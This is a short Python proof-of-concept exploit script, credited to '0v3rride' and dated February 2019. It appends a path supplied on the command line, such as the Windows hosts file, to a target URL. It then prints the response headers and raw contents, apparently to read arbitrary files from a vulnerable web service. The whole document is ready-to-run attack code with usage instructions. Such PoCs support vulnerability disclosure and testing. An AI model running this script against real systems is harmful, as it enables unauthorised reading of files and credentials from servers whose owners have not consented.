#!/usr/bin/env python

#######################
#   PoC by: 0v3rride  #
#  DoC: February 2019 #
#######################

from requests import *
from sys import *;


def travel(fullurl):
    r = get(fullurl);
    print("-" * 80 + "\n[i]: Supplied URL: {}".format(fullurl))
    print("-" * 80 + "\n[i]: Response Status Code: {}".format(r.status_code));
    print("-" * 80 + "\n[i]: Response Headers:\n");

    for hdr in r.headers:
        print("{}: {}".format(hdr, r.headers[hdr]));

    print("-" * 80 + "\n[i]: RAW DATA RETURNED FROM RESPONSE: \n{}".format(r.text));


if len(argv) < 3:
    print("[i]: Usage -- ./poc <http(s)://FQDN or http(s)://<IP address>:<Port #> <file to query on the local machine that is affected (e.g. /windows/system32/drivers/etc/hosts)");
    print("[i]: Path needs to start with a '/'.");
else:
    try:
        print("[i]: https://github.com/0v3rride/");
        print("-" * 80 + "\n[!] Sending the request...");
        travel(argv[1] + argv[2]);
    except RequestException as re:
        print(re.strerror);
    finally:
        print("-" * 80 + "\n[!] Done!");
